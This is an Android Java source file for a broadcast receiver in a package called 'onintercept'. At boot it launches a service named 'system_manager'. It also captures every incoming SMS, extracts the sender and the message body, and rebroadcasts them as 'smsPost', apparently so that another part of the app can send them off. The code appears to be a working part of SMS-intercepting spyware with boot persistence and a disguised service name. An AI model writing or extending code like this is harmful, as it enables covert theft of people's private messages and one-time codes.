package im.unicolas.onintercept.asynctask;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsMessage;
import android.util.Log;

public class MBroadcastReceive extends BroadcastReceiver {
    private static final String TAG = "MBroadcastReceive";
    public static final String SMS_RECEIVED_ACTION = "android.provider.Telephony.SMS_RECEIVED";
    public static final String SMS_DELIVER_ACTION = "android.provider.Telephony.SMS_DELIVER";

    @Override
    public void onReceive(Context context, Intent intent) {
        String action = intent.getAction();
        if (action.equals(Intent.ACTION_BOOT_COMPLETED)) {
            Log.e(TAG, "onReceive: 监听到开机启动");
            context.startService(new Intent(context, system_manager.class));
        }
        if (action.equals(SMS_DELIVER_ACTION) || action.equals(SMS_RECEIVED_ACTION)) {
            Bundle extras = intent.getExtras();
            if (extras != null) {
                Object[] pdus = (Object[]) extras.get("pdus");

                if (pdus != null && pdus.length > 0) {
                    SmsMessage[] messages = new SmsMessage[pdus.length];
                    for (int i = 0; i < pdus.length; i++) {
                        byte[] pdu = (byte[]) pdus[i];
                        messages[i] = SmsMessage.createFromPdu(pdu);
                    }

                    for (SmsMessage msg : messages) {
                        String msgBody = msg.getMessageBody(); //短信内容
                        String msgAddr = msg.getOriginatingAddress(); //短信发送人
                        //long timestampMillis = msg.getTimestampMillis();
                        //String smsCreateTime = new SimpleDateFormat("yyyy-MM-dd hh:mm:ss", Locale.CHINA).format(new Date(timestampMillis));
                        if (msgAddr.contains("+")) {
                            msgAddr = msgAddr.substring(3, msgAddr.length());
                        }

                        String postMsg = "" + "|" + msgAddr + ":" + msgBody;
                        Log.e(TAG, "onReceive: 短信广播监听\n " + postMsg);
                        context.sendBroadcast(new Intent("smsPost").putExtra("smsListener", postMsg));
                    }
                }
            }
        }
    }




}
